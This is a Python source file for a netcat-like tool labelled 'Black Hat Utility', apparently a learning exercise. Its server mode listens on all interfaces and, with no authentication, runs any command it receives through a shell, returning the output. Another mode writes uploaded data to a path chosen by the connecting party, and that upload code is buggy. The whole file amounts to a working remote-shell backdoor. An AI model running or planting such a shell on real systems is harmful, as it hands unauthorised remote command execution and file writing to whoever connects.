import argparse
import socket
import subprocess
import threading

import sys

import os


def initiate():
    parser = argparse.ArgumentParser(description="some message")
    parser.set_defaults()

    parser.add_argument('-t', '--target', action='store', help='address of target')
    parser.add_argument('-p', '--port', action='store', help='port to use')
    parser.add_argument('-l', '--listen', action='store_true',
                        help='listen on [host]:[port] for incoming connection')
    # parser.add_argument('-e', '--execute', action='store_true', help='execute the given file upon receiving '
    #                                                                 'a command shell')
    parser.add_argument('-c', '--command', action='store_true', help='initialize a command shell')
    parser.add_argument('-u', '--upload', action='store_true',
                        help='upon receiving connection upload a file and write to [destination]')
    args = parser.parse_args()
    print(args)
    return args


def client_sender(target, port):
    """
    This function is responsible for creating a connection between client and server
    Once the connection has been created, it collects input and send it to the server
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
    connected = False
    try:
        # connect to target host
        client.settimeout(10)
        client.connect((target, port))
        connected = True
    except socket.timeout:
        print("time out" + "\n" + "connection failed")
        client.close()

    """
    If connected, send data to server
    """
    if connected:
        print("connected to the server")

        while True:

            input_buffer = input("Enter: ")  # get input and send it
            input_buffer += "\n"
            client.send(input_buffer.encode('utf-8'))

            # wait for data back
            recv_len = 1
            respond = ""
            while recv_len > 0:
                data = client.recv(4096)  # buffer size is 4096
                recv_len = len(data)
                respond += data.decode('utf-8')

                if recv_len < 4096:
                    break
            print(respond)


def execute_command(command):
    """
    run command on current machine
    :param command: command to run
    :return: output of the command
    """
    command = command.rstrip()  # trim the new line
    # run shell command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception:
        output = "Failed to execute command. \r\n"

    return output


def command_shell(client_socket):
    """
    A thread run by server
    """

    while True:

        cmd_buffer = ""
        while "\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024).decode('utf-8')

        if cmd_buffer[0:2] == "cd":
            try:
                os.chdir(cmd_buffer[3:].strip())
                respond = execute_command("pwd")
            except FileNotFoundError:
                respond = "not such directory"
        else:
            respond = execute_command(cmd_buffer)

        if type(respond) is str:  # it becomes str when an error occurs
            respond = respond.encode('utf-8')
        if not len(respond):
            respond = "This command has no output. Current pwd is: ".encode('utf-8') + execute_command("pwd")

        client_socket.send(respond)


def upload_thread(client_socket):
    """

    TODO: cannot determine which file to upload
    """
    while True:

        upload_destination = ""
        while "\n" not in upload_destination:
            upload_destination += client_socket.recv(1024).decode('utf-8')

        if upload_destination:
            file_buffer = ""
            """
            read data until none is available 
            """
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                else:
                    file_buffer += data

            try:
                file_descriptor = open(upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()
                client_socket.send("successfully saved file to " + upload_destination)
            except Exception:
                client_socket.send("failed to save the file")


def server_loop(target, port, upload=None, command=None):
    if not target:
        target = "0.0.0.0"  # all interfaces!!!!!!!!!!!!!!!!!

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))  # bind the socket to a public host and a well-known port
    server.listen(5)  # don't understand this
    print("listening......")
    while True:
        client_socket, address = server.accept()  # create thread if receiving new socket
        print("receive a client socket from " + str(address))
        # create a thread whenever a client connects to the server
        if command:
            client_thread = threading.Thread(target=command_shell, args=(client_socket,))
        elif upload:
            client_thread = threading.Thread(target=upload_thread, args=(client_socket,))
        else:
            print("unknown error")
        client_thread.start()


def main():
    if not len(sys.argv[1:]):
        print("Black Hat Utility")
        print("use '-h' to print manual")
        return

    args = initiate()

    listen = None
    port = None
    command = None
    upload_location = None
    target = None

    if args.listen:
        listen = True
    if args.target:
        target = args.target
    if args.port:
        port = int(args.port)
    if args.command:
        command = args.command
    if args.upload:
        upload_location = args.upload

    if not port:
        print("missing port")
        return

    if not listen:  # client
        if not target:
            print("client missing target")
        # buffer = sys.stdin.read()  # read from terminal and send to the server; stop when ctrl + D
        client_sender(target, port)

    if listen:  # server
        if command and upload_location:
            print("choose either upload or run command")
            return

        if command:
            server_loop(target, port, command=command)
        elif upload_location:
            server_loop(target, port, upload=upload_location)
        else:
            print("choose from command or upload")


if __name__ == '__main__':
    main()
